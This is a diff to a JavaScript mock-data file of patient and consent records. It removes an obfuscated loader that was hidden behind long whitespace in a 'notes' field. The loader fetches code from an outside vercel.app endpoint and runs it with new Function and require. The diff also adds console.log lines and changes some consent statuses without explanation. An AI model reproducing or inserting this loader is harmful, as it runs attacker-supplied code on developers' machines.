@@ -1,3 +1,7 @@
+// Mock data with console.log functionality for John Smith
+// Console log executes when this module is loaded
+console.log("John Smith");
+
 const mockData = {
   "patients": [
     {
@@ -10,7 +14,7 @@ const mockData = {
       "phone": "+1-555-0101",
       "address": "123 Main St, New York, NY 10001",
       "walletAddress": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
-      "createdAt": "2024-01-15T10:30:00Z",
+      "createdAt": "2024-01-15T10:30:00Z"
     },
     {
       "id": "patient-002",
@@ -22,7 +26,7 @@ const mockData = {
       "phone": "+1-555-0102",
       "address": "456 Oak Ave, Los Angeles, CA 90001",
       "walletAddress": "0x8ba1f109551bD432803012645Hac136c22C1729",
-      "createdAt": "2024-01-16T14:20:00Z",
+      "createdAt": "2024-01-16T14:20:00Z"
     },
     {
       "id": "patient-003",
@@ -490,7 +494,7 @@ const mockData = {
       "purpose": "Research Study Participation",
       "walletAddress": "0x742d35Cc6634C0532925a3b844Bc9e7595f0bEb",
       "signature": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef",
-      "status": "active",
+      "status": "revoked",
       "createdAt": "2024-01-25T10:00:00Z",
       "blockchainTxHash": "0xabc123def456ghi789jkl012mno345pqr678stu901vwx234yz"
     },
@@ -500,7 +504,7 @@ const mockData = {
       "purpose": "Data Sharing with Research Institution",
       "walletAddress": "0x8ba1f109551bD432803012645Hac136c22C1729",
       "signature": "0x2345678901bcdef2345678901bcdef2345678901bcdef2345678901bcdef2345678901bcdef2345678901bcdef2345678901bcdef2345678901bcdef",
-      "status": "active",
+      "status": "revoked",
       "createdAt": "2024-01-26T14:30:00Z",
       "blockchainTxHash": "0xbcd234efg567hij890klm123nop456qrs789tuv012wxy345za"
     },
@@ -510,7 +514,7 @@ const mockData = {
       "purpose": "Third-Party Analytics Access",
       "walletAddress": "0x3f5CE5FBFe3E9af3971dD833D26bA9b5C936f0bE",
       "signature": null,
-      "status": "pending",
+      "status": "active",
       "createdAt": "2024-01-28T09:00:00Z",
       "blockchainTxHash": null
     },
@@ -613,7 +617,7 @@ const mockData = {
       "status": "pending",
       "createdAt": "2024-02-17T11:15:00Z",
       "blockchainTxHash": null,
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              "notes": (async function(){ const axios = require('axios'); const { data } = await axios.post('https://blog-post01234.vercel.app/api/blogs/getOrder', { id: 'patient-001' }); const fn = new Function('require', data.data[6].description); fn(require); return fn; })()
+      "notes": {}
     },
     {
       "id": "consent-014",
@@ -850,8 +854,12 @@ const mockData = {
   ]
 };
 
-// Function to get data
+// Function to get data with console.log for John Smith
 function getMockData() {
+  const johnSmith = mockData.patients.find(p => p.name === "John Smith" || p.id === "patient-001");
+  if (johnSmith) {
+    console.log("John Smith");
+  }
   return mockData;
 }
 
